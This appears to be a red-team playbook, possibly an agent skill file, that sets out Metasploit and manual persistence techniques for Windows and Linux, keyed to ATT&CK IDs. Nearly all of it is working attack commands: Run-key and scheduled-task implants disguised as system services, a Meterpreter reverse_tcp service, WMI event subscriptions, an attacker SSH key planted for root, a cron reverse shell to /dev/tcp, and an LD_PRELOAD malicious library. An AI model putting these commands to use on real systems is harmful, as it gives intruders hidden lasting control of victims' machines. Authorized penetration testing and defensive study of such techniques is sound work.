# Persistence Mechanisms via Metasploit

> ‚ö†Ô∏è All persistence requires explicit authorization (ALLOW_PERSISTENCE=true)

## Windows Persistence

### Registry Run Keys (T1547.001) üü°
```
# Meterpreter persistence script (classic)
run persistence -U -i 30 -p <LPORT> -r <LHOST>
# -U = run at user logon
# -S = run as service (SYSTEM)
# -X = run at system startup
# -i = reconnect interval (seconds)

# Post module (more control)
run post/windows/manage/persistence_exe \
  REXEPATH=/tmp/payload.exe \
  REXENAME=svchost_update.exe \
  STARTUP=USER \
  LOCALEXEPATH=C:\\Users\\Public\\svchost_update.exe

# Manual registry key
reg setval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' \
  -v 'WindowsUpdate' -d 'C:\Users\Public\update.exe'
reg setval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' \
  -v 'SystemHealth' -d 'C:\Windows\Temp\health.exe'
```

### Scheduled Task (T1053.005) üü°
```
# Create scheduled task via shell
shell
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc ONLOGON /ru SYSTEM /f
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\svc.exe" /sc MINUTE /mo 30 /ru SYSTEM /f
exit

# Via post module
run post/windows/manage/schtasks_exec \
  CMD="powershell -ep bypass -w hidden -e <BASE64_PAYLOAD>" \
  TASKNAME="SystemMaintenance" \
  SCHEDULE="ONLOGON"
```

### Windows Service (T1543.003) üü°
```
# Meterpreter service persistence
use exploit/windows/local/persistence_service
set SESSION <SESSION_ID>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
set SERVICE_NAME "WindowsHealthMonitor"
set SERVICE_DESCRIPTION "Windows Health Monitoring Service"
set RETRY_TIME 30
exploit

# Manual service creation
shell
sc create "WindowsHealthSvc" binpath= "C:\Windows\Temp\svc.exe" start= auto DisplayName= "Windows Health Service"
sc description "WindowsHealthSvc" "Windows Health Monitoring and Reporting"
sc start "WindowsHealthSvc"
exit
```

### WMI Event Subscription (T1546.003) üî¥
```
# Fileless persistence via WMI (survives reboot)
# Via PowerShell through Meterpreter:
execute -H -f powershell.exe -a '-ep bypass -c "
$FilterArgs = @{
    Name = \"SystemHealthFilter\";
    EventNameSpace = \"root\\cimv2\";
    QueryLanguage = \"WQL\";
    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 360\"
};
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs;
$ConsumerArgs = @{
    Name = \"SystemHealthConsumer\";
    CommandLineTemplate = \"C:\\Windows\\Temp\\svc.exe\"
};
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs;
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}
"'
```

### Startup Folder üü¢
```
# Copy payload to startup folder
upload /tmp/payload.exe "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"

# All-users startup (requires admin)
upload /tmp/payload.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\update.exe"
```

## Linux Persistence

### SSH Authorized Keys (T1098.004) üü¢
```
run post/linux/manage/sshkey_persistence

# Manual:
shell
mkdir -p /root/.ssh
echo "<ATTACKER_PUBLIC_KEY>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
exit
```

### Cron Job (T1053.003) üü°
```
shell
# Every 5 minutes ‚Äî reverse shell callback
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'") | crontab -

# Hidden cron (using @reboot)
(crontab -l 2>/dev/null; echo "@reboot /tmp/.update 2>/dev/null &") | crontab -
exit
```

### Systemd Service (T1543.002) üü°
```
shell
cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/opt/.health/monitor
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

cp /tmp/payload /opt/.health/monitor
chmod +x /opt/.health/monitor
systemctl daemon-reload
systemctl enable system-health.service
systemctl start system-health.service
exit
```

### Shell RC File (T1546.004) üü¢
```
shell
# Append to bashrc (runs on every interactive shell)
echo '/tmp/.update 2>/dev/null &' >> /root/.bashrc
echo '/tmp/.update 2>/dev/null &' >> /home/<USER>/.bashrc

# Profile (runs on login)
echo '/tmp/.update 2>/dev/null &' >> /etc/profile.d/health.sh
exit
```

### LD_PRELOAD Hijack (T1574.006) üî¥
```
shell
# Create malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("/tmp/.update &");
}
EOF
gcc -shared -fPIC -o /usr/lib/libhealth.so /tmp/evil.c
echo "/usr/lib/libhealth.so" >> /etc/ld.so.preload
rm /tmp/evil.c
exit
```

## Cleanup Documentation Template
```json
{
  "persistence_type": "<type>",
  "target": "<host>",
  "mechanism": "<description>",
  "location": "<file/reg/service path>",
  "cleanup_commands": [
    "<command to remove persistence>"
  ],
  "deployed_at": "<timestamp>",
  "session_id": "<session>"
}
```
